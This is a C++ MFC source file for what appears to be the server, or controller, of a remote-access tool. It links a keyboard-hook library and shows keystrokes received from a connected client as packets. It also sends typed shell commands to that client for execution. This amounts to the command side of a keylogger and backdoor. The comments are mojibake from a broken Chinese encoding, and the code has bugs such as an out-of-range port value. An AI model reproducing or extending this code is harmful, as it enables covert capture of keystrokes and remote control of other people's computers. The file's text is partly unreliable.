
// MCServerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "MCServer.h"
#include "MCServerDlg.h"
#include "../../KeyHook/keyHook/common.h"
#include <thread>
#include "afxdialogex.h"
#pragma  comment(lib,"../../bin/keyboradhook.lib")
//����ͨ�ŵ�ͷ�ļ��Ϳ�
//ͷ�ļ�
#include <winsock2.h>
//���ļ�
#pragma comment(lib, "ws2_32.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

SOCKET s;
SOCKET sClient;
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���
int  CMCServerDlg::InitServer()
{
	//windows������ ����Ҫ��������api��������ĳ�ʼ���ͷ���ʼ��
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;

	wVersionRequested = MAKEWORD(2, 2);
	//��ʼ������

	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("��ʼ���׽��ֿ�ʧ�ܣ�\r\n"));

		//edit1.SetWindowTextW(TEXT("��ʼ���׽��ֿ�ʧ�ܣ�"));


	}

	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("��ʼ���׽��ֿ�ɹ���\r\n"));


		//GetDlgItem(n_Edit1)->SetWindowText("��ʼ���׽��ֿ�ɹ���");
		//edit2.SetWindowTextW(TEXT("��ʼ���׽��ֿ�ɹ���"));
	}


	//1.socket  ����һ���׽���
	s = socket(
		AF_INET,//INETЭ���
		SOCK_STREAM,//��ʾʹ�õ�ʹTCPЭ��
		0);

	if (s == INVALID_SOCKET) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("�����׽��ֿ�ʧ�ܣ�\r\n"));
		

		//GetDlgItem(n_Edit1)->SetWindowText("�����׽��ֿ�ʧ�ܣ�");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("�����׽��ֿ�ɹ���\r\n"));
		
		//GetDlgItem(n_Edit1)->SetWindowText("�����׽��ֿ�ɹ���");

	}
	//2.bind/listen ��/�����˿�
	//ip��ַ�������������еļ�ͥ��ַ
	//�˿ڣ������������ĸ�Ӧ�õ����ݣ�ֻ��һ�����0-65535�� 3389�˿� RDPԶ������˿� 88�˿� ��ҳ����� http 
	//53 dns 443 https 135 137 20/21 ftp 25
	//һ��Ӧ�ÿ���ʹ�ö��ٸ��˿�
	//�������ж��ٸ�tcp����
	//Դip��Դ�˿� ----------------------Ŀ��ip Ŀ��˿�


	//��ѡһ�������������û��ʹ�õĶ˿���ʹ��
	//һ��1024���� 
	//sockaddr s;���� ���� IP�Ͷ˿ڵĽṹ�� ������ ��Ϊ�ڲ���һ������
	sockaddr_in addr;//�����滻socketaddr�ṹ�� ���ߴ�Сһ��
	addr.sin_family = AF_INET;//д��
	addr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");//�̶���· ��д0.0.0.0 ��ʾ��ǰ���������ĵ�ַ�����Խ���
	addr.sin_port = htons(100861);//��  h:host to n:network short�������ֽ� �����ֽ��򣨴�β��ʽ���ͱ����ֽ���Сβ��ʽ��
	int nlength = sizeof(sockaddr_in);
	int nRet = bind(s, (sockaddr*)&addr, nlength);
	if (nRet == SOCKET_ERROR) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("�󶨶˿�ʧ�ܣ�\r\n"));
		
		//GetDlgItem(n_Edit1)->SetWindowText("�󶨶˿ڳɹ���");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("�󶨶˿ڳɹ���\r\n"));
	
		//GetDlgItem(n_Edit1)->SetWindowText("�󶨶˿�ʧ�ܣ�");
	}


	//����
	nRet = listen(s, 5);
	if (nRet == SOCKET_ERROR) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("���ü���״̬ʧ�ܣ�\r\n"));
		//edit1.SetWindowTextW(TEXT("���ü���״̬ʧ�ܣ�"));
		//GetDlgItem(n_Edit1)->SetWindowText("���ü���״̬ʧ�ܣ�");
		WSACleanup();
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(_T("���ü���״̬�ɹ�\r\n"),1);
		edit1.SetSel(-1);
		edit1.ReplaceSel(_T("��������ڼ������ӣ����Ժ�....\r\n"),1);
		//edit1.SetWindowTextW(TEXT("���ü���״̬�ɹ���"));
		//edit1.SetWindowTextW(TEXT("��������ڼ������ӣ����Ժ�...."));
		//GetDlgItem(n_Edit1)->SetWindowText("���ü���״̬�ɹ���");
		//GetDlgItem(n_Edit1)->SetWindowText("��������ڼ������ӣ����Ժ�....");

	}
	//3.accept �������� �ȴ���������
	//��һ������s��ʾ����socket, ר����������
	sockaddr_in remoteAddr;
	remoteAddr.sin_family = AF_INET;
	int addrlen;
	addrlen = sizeof(remoteAddr);
	//���ص�socket sClient��ר��������ͻ���ͨ�ŵ�socket,һ�����￪�߳�ѭ������
	sClient = accept(s, (sockaddr*)&addr, &addrlen);
	if (sClient == INVALID_SOCKET) {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("�ͻ�������ʧ��!\r\n"));
		//edit1.SetWindowTextW(TEXT("�ͻ�������ʧ�ܣ�"));

		//GetDlgItem(n_Edit1)->SetWindowText("����ʧ�ܣ�");
		WSACleanup();
		return 0;
	}
	else {
		edit1.SetSel(-1);
		edit1.ReplaceSel(TEXT("���ӽ�����׼����������\r\n"));
		//edit1.SetWindowTextW(TEXT("���ӽ�����׼����������"));
		//GetDlgItem(n_Edit1)->SetWindowText("���ӽ�����׼����������");
		return 0;
	}
}
class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMCServerDlg �Ի���



CMCServerDlg::CMCServerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_MCSERVER_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMCServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, edit1);
	DDX_Control(pDX, IDC_EDIT3, edit2);
	DDX_Control(pDX, IDC_EDIT2, edit3);
}

BEGIN_MESSAGE_MAP(CMCServerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CMCServerDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON1, &CMCServerDlg::OnBnClickedButton1)
END_MESSAGE_MAP()


// CMCServerDlg ��Ϣ�������

BOOL CMCServerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��
	
	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CMCServerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CMCServerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CMCServerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMCServerDlg::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	//CDialogEx::OnOK();	
	char szBuff[256] = { 0 };
	CString cstringBuf;
	edit2.GetWindowText(cstringBuf);
	

	//��CStringתchar*

	//std::string ss(W2A(cstringBuf));
	//const char* ccommand = ss.c_str();
	//strcpy_s(szBuff, ccommand);

	CStringA tmp;
	tmp = cstringBuf;
	char* pp = tmp.GetBuffer();
	strcpy_s(szBuff, pp);

	int nLength = strlen(szBuff);
	if (nLength > 255) {
		//printf("stack overflow");
		edit2.SetWindowText(TEXT("stack overflow"));
		return;
	}

	szBuff[nLength++] = '\n';    //���������ĩβ��Ҫ���ϻ���

	//Ȼ������������ֱ�ӷ����ͻ��ˣ���Ϊ�������롣

	const char* pStr = (const char*)szBuff;
	char szBuf[1024];
	MyPacket* pPkt = (MyPacket*)szBuf;

	pPkt->type = PACKET_RLY_CMD;
	pPkt->length = strlen(pStr) + 1;	//������ʾ���ݳ��ȣ��������ṹ��ͷ����ǰ��2��4�ֽڡ�
	memcpy(pPkt->data, pStr, pPkt->length);	//�����ݿ���������

	send(
		sClient,
		(const char*)pPkt,
		pPkt->length + sizeof(unsigned int) * 2,
		0
	);

	
}


void CMCServerDlg::OnBnClickedButton1()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	std::thread thd([&]() {
		InitServer();
		while (true) {
			char szOutBuf[256] = { 0 };
			int nRet;
			nRet = recv(sClient, szOutBuf, 8, 0);//����ֵ
			MyPacket* pPkt = (MyPacket*)szOutBuf;
			if (nRet == 0) {
				printf("recv error");
			}
			else if (nRet > 0) {
				if (pPkt->type == PACKET_REQ_KEYBOARD)
				{
					nRet = recv(sClient, szOutBuf, pPkt->length, 0);
					edit3.SetSel(-1);
					edit3.ReplaceSel(_T("������Ϣ\r\n"), 1);
					edit3.SetSel(-1);
					edit3.ReplaceSel(pPkt->data,1);
					

				}
				else
				{
					nRet = recv(sClient, szOutBuf, pPkt->length, 0);
					OutputDebugStringA((LPCSTR)pPkt->data);
					
					edit1.SetSel(-1);


					edit1.ReplaceSel((LPCTSTR)((LPCSTR)pPkt->data));
						//	, 1);

				}
			}
		}

	});
	thd.detach();
	
	/*	while (true) {
			char szOutBuf[256] = { 0 };
			int nRet;
			nRet = recv(sClient, szOutBuf, 255, 0);//����ֵ
			MyPacket* pPkt = (MyPacket*)szOutBuf;
			if (nRet == 0) {
				printf("recv error");
			}
			else if (nRet > 0) {
				if (pPkt->type == PACKET_REQ_KEYBOARD)
				{
					printf("������Ϣ");
					printf(pPkt->data);

				}
				else
				{
					printf("cmd��Ϣ");
					printf(pPkt->data);
				}


			}

		}

	});*/
	

	
}
